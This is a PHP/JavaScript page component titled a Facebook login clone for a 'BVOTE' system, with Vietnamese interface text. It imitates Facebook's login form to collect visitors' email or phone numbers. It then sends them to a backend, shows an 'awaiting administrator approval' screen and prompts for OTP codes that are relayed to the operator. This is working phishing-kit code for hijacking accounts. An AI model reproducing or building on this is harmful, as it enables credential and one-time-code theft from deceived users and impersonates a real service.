<?php
// FacebookLoginClone.php - BVOTE Auto Login System
?>
<div class="bg-white p-4 rounded-lg text-black w-full flex flex-col justify-center">
  <div class="p-4 bg-white border-none w-full">
    <div class="text-center mb-4">
      <h1 class="text-5xl font-bold text-blue-600">facebook</h1>
      <p class="text-sm text-gray-600 mt-2">Đăng nhập để tiếp tục BVOTE</p>
    </div>

    <form id="facebook-login-form" class="space-y-3" onsubmit="return handleFacebookLogin(event)">
      <div>
        <input id="facebook-account" name="account" type="text"
               placeholder="Email hoặc số điện thoại" required
               class="h-12 text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black" />
      </div>

      <button type="submit" class="w-full h-12 bg-blue-600 hover:bg-blue-700 text-lg font-bold text-white">
        Tiếp tục
      </button>
    </form>

    <div class="text-center mt-3 space-y-2">
      <button class="text-sm text-blue-600 hover:underline block">Quên mật khẩu?</button>
      <button class="text-sm text-blue-600 hover:underline block">Tạo tài khoản mới</button>
    </div>
  </div>
</div>

<script>
var isLoadingFacebook = false;

function handleFacebookLogin(e) {
  e.preventDefault();
  if (isLoadingFacebook) return false;

  const account = document.getElementById('facebook-account').value.trim();
  if (!account) {
    alert('Vui lòng nhập email hoặc số điện thoại');
    return false;
  }

  isLoadingFacebook = true;
  const submitBtn = e.target.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Đang xử lý...';
  submitBtn.disabled = true;

  // Gọi API Auto Login
  fetch('/api/social-login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      platform: 'facebook',
      user_hint: account
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      // Sử dụng Enhanced Waiting Screen
      if (window.enhancedWaitingScreen) {
        window.enhancedWaitingScreen.show(
          data.request_id,
          'facebook',
          account,
          (status, requestData) => {
            // Callback khi trạng thái thay đổi
            if (status === 'OTP_REQUIRED') {
              // Hiển thị Enhanced OTP Dialog
              if (window.enhancedOtpDialog) {
                window.enhancedOtpDialog.show(
                  data.request_id,
                  'facebook',
                  account,
                  (otpData) => {
                    // OTP thành công
                    console.log('OTP verification successful:', otpData);
                    window.location.reload();
                  },
                  (error) => {
                    // OTP thất bại
                    console.error('OTP verification failed:', error);
                  }
                );
              }
            } else if (status === 'APPROVED') {
              // Đăng nhập thành công
              console.log('Login approved:', requestData);
              window.location.reload();
            } else if (status === 'REJECTED') {
              // Đăng nhập bị từ chối
              console.log('Login rejected:', requestData);
            }
          }
        );
      } else {
        // Fallback to old waiting screen
        showWaitingScreen(data.request_id, 'facebook');
      }
    } else {
      alert('Lỗi: ' + (data.error || 'Không thể tạo yêu cầu đăng nhập'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  })
  .finally(() => {
    isLoadingFacebook = false;
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  });

  return false;
}

// Fallback function for old waiting screen
function showWaitingScreen(requestId, platform) {
  // Tạo modal chờ phê duyệt
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
        <h3 class="text-lg font-semibold mb-2">Đang chờ phê duyệt</h3>
        <p class="text-gray-600 mb-4">Yêu cầu đăng nhập của bạn đang được xem xét bởi quản trị viên.</p>
        <div class="text-sm text-gray-500">
          <p>Nền tảng: ${platform}</p>
          <p>ID yêu cầu: ${requestId}</p>
        </div>
        <div class="mt-4">
          <button onclick="checkLoginStatus('${requestId}')" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
            Kiểm tra trạng thái
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Tự động kiểm tra trạng thái mỗi 5 giây
  const interval = setInterval(() => {
    checkLoginStatus(requestId);

    // Kiểm tra nếu đã được xử lý thì dừng interval
    fetch(`/api/social-login/status/${requestId}`)
      .then(response => response.json())
      .then(data => {
        if (data.success && data.request.status !== 'PENDING_REVIEW') {
          clearInterval(interval);
          modal.remove();

          // Xử lý kết quả
          if (data.request.status === 'APPROVED') {
            alert('Đăng nhập thành công!');
            window.location.reload();
          } else if (data.request.status === 'OTP_REQUIRED') {
            alert('Yêu cầu xác thực OTP');
            // Hiển thị OTP dialog
            if (window.enhancedOtpDialog) {
              window.enhancedOtpDialog.show(requestId, platform, document.getElementById('facebook-account').value.trim());
            }
          } else if (data.request.status === 'REJECTED') {
            alert('Yêu cầu đăng nhập bị từ chối');
          }
        }
      });
  }, 5000);
}

function checkLoginStatus(requestId) {
  fetch(`/api/social-login/status/${requestId}`)
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        console.log('Login status:', data.request.status);
      }
    })
    .catch(error => {
      console.error('Status check error:', error);
    });
}

// Reset form khi component được load lại
function resetFacebookForm() {
  document.getElementById('facebook-account').value = '';
  isLoadingFacebook = false;
}
</script>
